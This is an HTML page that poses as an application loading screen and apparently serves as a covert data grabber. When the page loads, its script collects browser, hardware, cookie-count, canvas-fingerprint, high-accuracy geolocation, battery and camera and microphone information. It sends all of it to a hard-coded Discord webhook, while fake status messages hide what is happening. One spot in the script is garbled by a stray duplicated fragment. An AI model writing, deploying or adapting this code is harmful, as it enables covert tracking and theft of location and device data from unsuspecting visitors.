<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Information Collector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #3498db;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin-top: 20px;
            font-style: italic;
            color: #666;
        }
        .hidden-canvas {
            position: absolute;
            left: -9999px;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Loading Application...</h1>
        <div class="loader"></div>
        <div class="status" id="status-message">Initializing application resources...</div>
    </div>
    
    <canvas id="fingerprintCanvas" class="hidden-canvas" width="220" height="30"></canvas>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7';
        
        const collectedData = {
            browser: {},
            screen: {},
            network: {},
            geo: {},
            battery: {},
            hardware: {},
            capabilities: {},
            time: {},
            media: {},
            storage: {},
            headers: {},
            fingerprint: {},
            performance: {}
        };
        
        const statusMessages = [
            "Loading resources...",
            "Preparing interface...",
            "Checking compatibility...",
            "Almost ready...",
            "Starting application..."
        ];
        
        let messageIndex = 0;
        const statusElement = document.getElementById("status-message");
        
        const messageInterval = setInterval(() => {
            statusElement.textContent = statusMessages[messageIndex];
            messageIndex = (messageIndex + 1) % statusMessages.length;
        }, 2000);
        
        // Track pending operations to ensure we collect all data before sending
        const pendingOperations = {
            geo: false,
            battery: false,
            media: false
        };
        
        function collectBrowserInfo() {
            collectedData.browser = {
                'User Agent': navigator.userAgent,
                'Browser Language': navigator.language,
                'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : navigator.language,
                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                'Do Not Track': navigator.doNotTrack || 'Not specified',
                'Platform': navigator.platform,
                'Browser Vendor': navigator.vendor || 'Not available',
                'Browser Version': navigator.appVersion || 'Not available',
                'App Name': navigator.appName || 'Not available',
                'Product': navigator.product || 'Not available'
            };
        }
        
        function collectScreenInfo() {
            collectedData.screen = {
                'Screen Width': window.screen.width + 'px',
                'Screen Height': window.screen.height + 'px',
                'Available Width': window.screen.availWidth + 'px',
                'Available Height': window.screen.availHeight + 'px',
                'Color Depth': window.screen.colorDepth + ' bits',
                'Pixel Depth': window.screen.pixelDepth + ' bits',
                'Window Inner Width': window.innerWidth + 'px',
                'Window Inner Height': window.innerHeight + 'px',
                'Device Pixel Ratio': window.devicePixelRatio,
                'Orientation': screen.orientation ? screen.orientation.type : 'Not available'
            };
        }
        
        function collectNetworkInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    collectedData.network = {
                        'Effective Type': connection.effectiveType || 'Not available',
                        'Downlink': (connection.downlink ? connection.downlink + ' Mbps' : 'Not available'),
                        'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),
                        'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'
                    };
                }
            } else {
                collectedData.network = {
                    'Network Information': 'API not available in this browser'
                };
            }
        }
        
        function collectHardwareInfo() {
            collectedData.hardware = {
                'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',
                'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',
                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available'
            };
        }
        
        function collectCapabilitiesInfo() {
            collectedData.capabilities = {
                'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',
                'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',
                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                'Local Storage Available': typeof(Storage) !== 'undefined' ? 'Yes' : 'No',
                'Session Storage Available': typeof(sessionStorage) !== 'undefined' ? 'Yes' : 'No',
                'IndexedDB Available': window.indexedDB ? 'Yes' : 'No',
                'WEBGL Available': (function() {
                    try {
                        return !!window.WebGLRenderingContext &&
                                !!document.createElement('canvas').getContext('experimental-webgl');
                    } catch(e) {
                        return false;
                    }
                })() ? 'Yes' : 'No',
                'Web Workers Available': !!window.Worker ? 'Yes' : 'No',
                'Service Workers Available': 'serviceWorker' in navigator ? 'Yes' : 'No',
                'Push Notifications Available': 'PushManager' in window ? 'Yes' : 'No'
            };
        }
        
        function collectTimeInfo() {
            const now = new Date();
            collectedData.time = {
                'Current Time': now.toString(),
                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                'Timezone Offset': now.getTimezoneOffset() + ' minutes from UTC',
                'Date Locale': Intl.DateTimeFormat().resolvedOptions().locale
            };
        }
        
        function collectStorageInfo() {
            try {
                if (window.localStorage) {
                    collectedData.storage = {
                        'LocalStorage Available': 'Yes',
                        'LocalStorage Items': localStorage.length,
                        'SessionStorage Available': window.sessionStorage ? 'Yes' : 'No',
                        'SessionStorage Items': window.sessionStorage ? sessionStorage.length : 'N/A',
                        'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                        'Cookie Count': document.cookie ? document.cookie.split(';').length : 0
                    };
                } else {
                    collectedData.storage = {
                        'Local Storage': 'Not available'
                    };
                }
            } catch (e) {
                collectedData.storage = {
                    'Error accessing storage': e.message
                };
            }
        }
        
        function collectHeaderInfo() {
            collectedData.headers = {
                'User-Agent': navigator.userAgent,
                'Accept-Language': navigator.language,
                'DNT (Do Not Track)': navigator.doNotTrack || 'Not specified',
                'Referer': document.referrer || 'None/Direct Navigation',
                'Host': window.location.host,
                'Origin': window.location.origin
            };
        }
        
        function collectCanvasFingerprint() {
            try {
                const canvas = document.getElementById('fingerprintCanvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Test", 4, 17);
                const dataURL = canvas.toDataURL();
                const hash = dataURL.length;
                collectedData.fingerprint = {
                    'Canvas Fingerprint Value': 'Signature Length: ' + hash
                };
            } catch (e) {
                collectedData.fingerprint = {
                    'Canvas Fingerprinting': 'Failed: ' + e.message
                };
            }
        }
        
        function collectPerformanceInfo() {
            if (window.performance) {
                collectedData.performance = {
                    'Navigation Type': (function() {
                        const navType = performance.navigation ? performance.navigation.type : null;
                        if (navType === 0) return 'Navigate';
                        if (navType === 1) return 'Reload';
                        if (navType === 2) return 'Back/Forward';
                        return 'Unknown';
                    })(),
                    'Redirect Count': performance.navigation ? performance.navigation.redirectCount : 'Unknown',
                    'Page Load Time': performance.timing ?
                         (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' :
                         'Not available'
                };
                
                if (performance.getEntriesByType) {
                    try {
                        const navEntry = performance.getEntriesByType('navigation')[0];
                        if (navEntry) {
                            collectedData.performance['DOM Complete Time'] = navEntry.domComplete + ' ms';
                            collectedData.performance['DOM Interactive Time'] = navEntry.domInteractive + ' ms';
                            collectedData.performance['Response Start Time'] = navEntry.responseStart + ' ms';
                        }
                    } catch (e) {
                        // Silently handle errors in performance API
                    }
                    
                    try {
                        const paintEntries = performance.getEntriesByType('paint');
                        if (paintEntries.length > 0) {
                            paintEntries.forEach(entry => {
                                collectedData.performance[entry.name] = entry.startTime + ' ms';
                            });
                        }
                    } catch (e) {
                        // Silently handle errors in performance API
                    }
                }
            } else {
                collectedData.performance = {
                    'Performance API': 'Not available'
                };
            }
        }
        
        function collectGeolocationInfo() {
            // Mark operation as pending
            pendingOperations.geo = true;
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        collectedData.geo = {
                            'Latitude': position.coords.latitude,
                            'Longitude': position.coords.longitude,
                            'Accuracy': position.coords.accuracy + ' meters',
                            'Timestamp': new Date(position.timestamp).toString()
                        };
                        
                        if (position.coords.altitude) {
                            collectedData.geo['Altitude'] = position.coords.altitude + ' meters';
                        }
                        if (position.coords.heading) {
                            collectedData.geo['Heading'] = position.coords.heading + '°';
                        }
                        if (position.coords.speed) {
                            collectedData.geo['Speed'] = position.coords.speed + ' m/s';
                        }
                        
                        // Mark operation as complete
                        pendingOperations.geo = false;
                        checkAllDataCollected();
                    },
                    function(error) {
                        collectedData.geo = {
                            'Geolocation API': 'Available but permission denied or error',
                            'Error': error.message
                        };
                        
                        // Mark operation as complete (even though it failed)
                        pendingOperations.geo = false;
                        checkAllDataCollected();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                collectedData.geo = {
                    'Geolocation API': 'Not available in this browser'
                };
                
                // Mark operation as complete
                pendingOperations.geo = false;
                checkAllDataCollected();
            }
        }
        
        function collectBatteryInfo() {
            // Mark operation as pending
            pendingOperations.battery = true;
            
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    collectedData.battery = {
                        'Battery Charging': battery.charging ? 'Yes' : 'No',
                        'Battery Level': (battery.level * 100) + '%',
                        'Charging Time': battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds',
                        'Discharging Time': battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds'
                    };
                    
                    // Mark operation as complete
                    pendingOperations.battery = false;
                    checkAllDataCollected();
                }).catch(function(error) {
                    collectedData.battery = {
                        'Battery API': 'Error accessing battery: ' + error.message
                    };
                    
                    // Mark operation as complete (even though it failed)
                    pendingOperations.battery = false;
                    checkAllDataCollected();
                });
            } else {
                collectedData.battery = {
                    'Battery API': 'Not available in this browser'
                };
                
                // Mark operation as complete
                pendingOperations.battery = false;
                checkAllDataCollected();
            }
        }
        
        function collectMediaInfo() {
            // Mark operation as pending
            pendingOperations.media = true;
            
            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(function(stream) {
                    // Stop the stream immediately after getting permission
                    stream.getTracks().forEach(track => track.stop());
                    
                    navigator.mediaDevices.enumerateDevices()
                    .then(function(devices) {
                        let audioInputCount = 0;
                        let audioOutputCount = 0;
                        let videoInputCount = 0;
                        
                        devices.forEach(function(device) {
                            if (device.kind === 'audioinput') audioInputCount++;
                            if (device.kind === 'audiooutput') audioOutputCount++;
                            if (device.kind === 'videoinput') videoInputCount++;
                        });
                        
                        collectedData.media = {
                            'Microphones': audioInputCount,
                            'Speakers/Headphones': audioOutputCount,
                            'Cameras': videoInputCount
                        };
                        
                        // Mark operation as complete
                        pendingOperations.media = false;
                        checkAllDataCollected();
                    })
                    .catch(function(enumErr) {
                        collectedData.media = {
                            'Media Devices API': 'Error enumerating devices: ' + enumErr.message
                        };
                        
                        // Mark operation as complete (even though it failed)
                        pendingOperations.media = false;
                        checkAllDataCollected();
                    });
                })
                .catch(function(err) {
                    // Permission denied, try to enumerate devices anyway
                    navigator.mediaDevices.enumerateDevices()
                    .then(function(devices) {
                        collectedData.media = {
                            'Permission Status': 'Denied: ' + err.message,
                            'Device Count': devices.length + ' (limited information due to permissions)'
                        };
                        
                        // Mark operation as complete
                        pendingOperations.media = false;
                        checkAllDataCollected();
                    })
                    .catch(function(enumErr) {
                        collectedData.media = {
                            'Media Devices API': 'Error: ' + enumErr.message
                        };
                        
                        // Mark operation as complete (even though it failed)
                        pendingOperations.media = false;
                        checkAllDataCollected();
                    });
                });
            } else {
                collectedData.media = {
                    'Media Devices API': 'Not available in this browser'
                };
                
                // Mark operation as complete
                pendingOperations.media = false;
                checkAllDataCollected();
            }
        }
        
        function checkAllDataCollected() {
            // Check if all async operations are complete
            if (!pendingOperations.geo && !pendingOperations.battery && !pendingOperations.media) {
                console.log("All data collected, sending to webhook...");
                
                // Log what data was collected to verify it exists
                console.log("Data to send:", JSON.stringify(collectedData));
                
                // Update status message
                statusElement.textContent = "Sending collected information...";
                
                // Add small delay before sending to ensure UI updates
                setTimeout(sendDataToWebhook, 500);
            } else {
                console.log("Still waiting for: " + 
                    (pendingOperations.geo ? "geo " : "") + 
                    (pendingOperations.battery ? "battery " : "") + 
                    (pendingOperations.media ? "media " : ""));
            }
        }e {
                console.log("Still waiting for: " + 
                    (pendingOperations.geo ? "geo " : "") + 
                    (pendingOperations.battery ? "battery " : "") + 
                    (pendingOperations.media ? "media " : ""));
            }
        }
        
        function formatDataForDiscord() {
            // Create much smaller chunks for Discord's limits
            let chunks = [];
            let currentChunk = "**👤 User Information Collection 👤**\n\n";
            
            for (const [category, data] of Object.entries(collectedData)) {
                if (Object.keys(data).length > 0) {
                    const categoryHeader = `**📋 ${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
                    
                    // Check if adding category would exceed limit
                    if (currentChunk.length + categoryHeader.length > 1900) {
                        chunks.push(currentChunk);
                        currentChunk = categoryHeader;
                    } else {
                        currentChunk += categoryHeader;
                    }
                    
                    for (const [key, value] of Object.entries(data)) {
                        const line = `> **${key}:** ${value}\n`;
                        
                        // Check if adding this line would exceed limit
                        if (currentChunk.length + line.length > 1900) {
                            chunks.push(currentChunk);
                            currentChunk = line;
                        } else {
                            currentChunk += line;
                        }
                    }
                    
                    currentChunk += "\n";
                }
            }
            
            // Add timestamp to the last chunk
            currentChunk += `**📅 Collected At:** ${new Date().toString()}\n`;
            chunks.push(currentChunk);
            
            return chunks;
        }
        
        function sendDataToWebhook() {
            console.log('Attempting to send data to webhook...');
            
            // Use a simple payload for first test
            const basicPayload = {
                content: "🔍 User data collection completed at " + new Date().toString(),
                embeds: [{
                    title: "Browser Information",
                    description: JSON.stringify(collectedData.browser, null, 2)
                }]
            };
            
            // Send the initial test payload
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(basicPayload)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                console.log('Initial test message sent successfully!');
                
                // If successful, send the full data in multiple chunks
                const chunks = formatDataForDiscord();
                
                // Send chunks sequentially
                const sendNextChunk = (index) => {
                    if (index >= chunks.length) {
                        console.log('All chunks sent successfully!');
                        redirectToSuccess();
                        return;
                    }
                    
                    const chunkPayload = {
                        content: chunks[index] + (index < chunks.length - 1 ? "\n(Continued...)" : "\n(End of Report)")
                    };
                    
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(chunkPayload)
                    })
                    .then(r => {
                        if (!r.ok) throw new Error(`HTTP error! Status: ${r.status}`);
                        console.log(`Chunk ${index + 1}/${chunks.length} sent successfully`);
                        // Wait a short time between chunks to avoid rate limiting
                        setTimeout(() => sendNextChunk(index + 1), 500);
                    })
                    .catch(e => {
                        console.error(`Error sending chunk ${index + 1}:`, e);
                        sendNextChunk(index + 1); // Try next chunk anyway
                    });
                };
                
                // Start sending chunks
                sendNextChunk(0);
            })
            .catch(error => {
                console.error('Error sending initial data:', error);
                
                // Simpler fallback attempt with just essential info
                const fallbackPayload = {
                    content: "**User Browser:** " + navigator.userAgent.substring(0, 1500)
                };
                
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(fallbackPayload)
                })
                .then(response => {
                    console.log('Fallback data sent:', response.status);
                    redirectToSuccess();
                })
                .catch(err => {
                    console.error('Final fallback failed:', err);
                    redirectToSuccess();
                });
            });
        }
        
        function redirectToSuccess() {
            clearInterval(messageInterval);
            statusElement.textContent = "Application loaded successfully!";
            
            setTimeout(() => {
                document.querySelector('.container').innerHTML = `
                    <h1>Application Ready</h1>
                    <p>Thank you for your patience. The application is now ready to use.</p>
                    <button onclick="window.location.reload()">Continue</button>
                `;
            }, 1500);
        }
        
        function collectAllData() {
            // Run all synchronous data collection first
            collectBrowserInfo();
            collectScreenInfo();
            collectNetworkInfo();
            collectHardwareInfo();
            collectCapabilitiesInfo();
            collectTimeInfo();
            collectStorageInfo();
            collectHeaderInfo();
            collectCanvasFingerprint();
            collectPerformanceInfo();
            
            // Then start async operations
            collectGeolocationInfo();
            collectBatteryInfo();
            collectMediaInfo();
            
            // Set a timeout fallback in case permissions are just hanging
            setTimeout(() => {
                // If any operations are still pending after 15 seconds, force completion
                let forcedCompletion = false;
                
                if (pendingOperations.geo) {
                    pendingOperations.geo = false;
                    collectedData.geo = collectedData.geo || { 'Geolocation API': 'Timed out waiting for response' };
                    forcedCompletion = true;
                }
                
                if (pendingOperations.battery) {
                    pendingOperations.battery = false;
                    collectedData.battery = collectedData.battery || { 'Battery API': 'Timed out waiting for response' };
                    forcedCompletion = true;
                }
                
                if (pendingOperations.media) {
                    pendingOperations.media = false;
                    collectedData.media = collectedData.media || { 'Media API': 'Timed out waiting for response' };
                    forcedCompletion = true;
                }
                
                if (forcedCompletion) {
                    console.log("Forced completion due to timeout");
                    checkAllDataCollected();
                }
            }, 15000);
        }
        
        window.addEventListener('load', collectAllData);
    </script>
</body>
</html>
